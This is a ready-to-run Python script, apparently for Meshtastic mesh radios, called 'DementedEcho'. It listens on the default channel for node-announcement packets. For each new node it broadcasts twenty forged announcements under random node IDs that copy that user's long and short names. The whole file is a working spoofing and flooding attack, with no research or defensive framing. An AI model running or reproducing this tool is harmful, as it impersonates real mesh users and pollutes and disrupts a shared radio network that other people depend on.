import sys
import time
import struct
import random
from mt_radio_serial import mt_radio_serial
from mt_lite import mt_lite
from mt_packet import mt_packet
from mt_channel import channel
import pypb

def demented_echo(port):
    print(f"Connecting to {port} and enabling DementedEcho...")
    radio = mt_radio_serial(port, diag=False)
    mesht = mt_lite(radio)
    
    ch = channel('LongFast', 1)
    
    processed_ids = set()
    
    print("Listening for NodeInfo packets...")
    while True:
        mesht.update()
        pkt = mesht.get()
        if pkt and pkt.decrypted:
            # Check if it's a NodeInfo packet (PortNum 4)
            payload_map = pkt.payload
            portnum = payload_map.get(1)
            
            if portnum == 4:
                user_bytes = payload_map.get(2)
                if user_bytes:
                    user_map = pypb.protobuf(user_bytes).to_map()
                    long_name = user_map.get(2, b"Unknown").decode('utf-8', 'ignore')
                    short_name = user_map.get(3, b"????").decode('utf-8', 'ignore')
                    
                    if pkt.src not in processed_ids:
                        print(f"\nDETECTED: '{long_name}' ({short_name}) from {hex(pkt.src)}")
                        print(f"Cloning identity 20 times...")
                        
                        from ghost_fleet import create_user_pb, create_data_pb
                        
                        for i in range(20):
                            fake_id = random.getrandbits(32)
                            # Apply same names
                            u_pb = create_user_pb(fake_id, long_name, short_name)
                            d_pb = create_data_pb(u_pb, portnum=4)
                            
                            echo_pkt = mt_packet()
                            echo_pkt.src = fake_id
                            echo_pkt.dest = 0xFFFFFFFF
                            echo_pkt.payload = d_pb
                            echo_pkt.decrypted = True
                            echo_pkt.hash = ch.getHash()
                            echo_pkt.seq = random.getrandbits(32)
                            
                            mesht.send(echo_pkt)
                            time.sleep(0.2)
                        
                        processed_ids.add(pkt.src)
                        print("Cloning complete. Resuming watch...")
        
        time.sleep(0.1)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python3 demented_echo.py [serial_port]")
        sys.exit(1)
    
    demented_echo(sys.argv[1])
